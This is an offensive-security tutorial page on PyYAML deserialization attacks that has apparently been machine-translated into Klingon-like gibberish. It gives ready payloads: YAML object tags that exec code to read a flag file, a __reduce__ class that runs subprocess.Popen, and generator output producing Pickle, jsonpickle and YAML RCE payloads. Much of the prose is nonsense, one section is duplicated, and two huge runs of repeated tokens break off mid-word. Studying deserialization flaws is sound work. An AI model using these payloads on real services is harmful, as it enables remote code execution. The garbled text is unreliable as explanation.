<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>


# Yaml **Deserialization**

**Yaml** python libraries is also capable to **serialize python objects** and not just raw data:
```
print(yaml.dump(str("lol")))
lol
...

print(yaml.dump(tuple("lol")))
!!python/tuple
- l
- o
- l

print(yaml.dump(range(1,10)))
!!python/object/apply:builtins.range
- 1
- 10
- 1
```
**tuple** **ghItlh** raw type of data **jatlh** **serialized**. **range** (taken from the builtins) **ghItlh** **serialized**.

![](<../../.gitbook/assets/image (628) (1).png>)

**safe\_load()** **safe\_load\_all()** SafeLoader **vItlhutlh** **class object deserialization** **jatlh**. Class object deserialization example:
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
data = b'!!python/object/apply:builtins.range [1, 10, 1]'

print(yaml.load(data, Loader=UnsafeLoader)) #range(1, 10)
print(yaml.load(data, Loader=Loader)) #range(1, 10)
print(yaml.load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.load_all(data, Loader=Loader)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.load_all(data, Loader=UnsafeLoader)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.load_all(data, Loader=FullLoader)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.unsafe_load(data)) #range(1, 10)
print(yaml.full_load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.unsafe_load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>

#The other ways to load data will through an error as they won't even attempt to
#deserialize the python object
```
**unsafe\_load** vItlhutlh **serialized python class** load **code** previous. **version >= 5.1** **deserialize any serialized python class or class attribute** **allow** **Loader not specified in load() or Loader=SafeLoader**.

## Basic Exploit

**execute a sleep** **example** **how to**:
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
data = b'!!python/object/apply:time.sleep [2]'
print(yaml.load(data, Loader=UnsafeLoader)) #Executed
print(yaml.load(data, Loader=Loader)) #Executed
print(yaml.load_all(data))
print(yaml.load_all(data, Loader=Loader))
print(yaml.load_all(data, Loader=UnsafeLoader))
print(yaml.load_all(data, Loader=FullLoader))
print(yaml.unsafe_load(data)) #Executed
print(yaml.full_load_all(data))
print(yaml.unsafe_load_all(data))
```
## Vulnerable .load("\<content>") without Loader

**Old versions** of pyyaml were vulnerable to deserialisations attacks if you **didn't specify the Loader** when loading something: `yaml.load(data)`

You can find the  [**description of the vulnerability here**](https://hackmd.io/@defund/HJZajCVlP)**.** The proposed **exploit** in that page is:

## .load("\<content>") without Loader Vulnerable

**Old versions** of pyyaml were vulnerable to deserialisations attacks if you **didn't specify the Loader** when loading something: `yaml.load(data)`

You can find the  [**description of the vulnerability here**](https://hackmd.io/@defund/HJZajCVlP)**.** The proposed **exploit** in that page is:
```yaml
!!python/object/new:str
state: !!python/tuple
- 'print(getattr(open("flag\x2etxt"), "read")())'
- !!python/object/new:Warning
state:
update: !!python/name:exec
```
**@ishaack** **tlhIngan Hol** **ghItlh** **vaj** **'oH** **'ej** **ghItlh** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **vaj** **'oH** **vItlhutlh** **'e'** **v
```yaml
!!python/object/new:str {state: !!python/tuple ['print(exec("print(o"+"pen(\"flag.txt\",\"r\").read())"))', !!python/object/new:Warning {state : {update : !!python/name:exec } }]}
```
**ghItlhvam** **vItlhutlh** **.load()** **jatlh** **vaj **`Loader`** **vItlhutlh** **vaj** **`FullLoader`** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **v
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
import subprocess

class Payload(object):
def __reduce__(self):
return (subprocess.Popen,('ls',))

deserialized_data = yaml.dump(Payload()) # serializing data
print(deserialized_data)

#!!python/object/apply:subprocess.Popen
#- ls

print(yaml.load(deserialized_data, Loader=UnsafeLoader))
print(yaml.load(deserialized_data, Loader=Loader))
print(yaml.unsafe_load(deserialized_data))
```
## tlhIngan Hol

The tool [https://github.com/j0lt-github/python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) can be used to generate python deserialization payloads to abuse **Pickle, PyYAML, jsonpickle and ruamel.yaml:**
```bash
python3 peas.py
Enter RCE command :cat /root/flag.txt
Enter operating system of target [linux/windows] . Default is linux :linux
Want to base64 encode payload ? [N/y] :
Enter File location and name to save :/tmp/example
Select Module (Pickle, PyYAML, jsonpickle, ruamel.yaml, All) :All
Done Saving file !!!!

cat /tmp/example_jspick
{"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": [{"py/tuple": ["cat", "/root/flag.txt"]}]}]}

cat /tmp/example_pick | base64 -w0
gASVNQAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlIwDY2F0lIwOL3Jvb3QvZmxhZy50eHSUhpSFlFKULg==

cat /tmp/example_yaml
!!python/object/apply:subprocess.Popen
- !!python/tuple
- cat
- /root/flag.txt
```
## References

* [https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf)
* [https://net-square.com/yaml-deserialization-attack-in-python.html](https://net-square.com/yaml-deserialization-attack-in-python.html)


<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
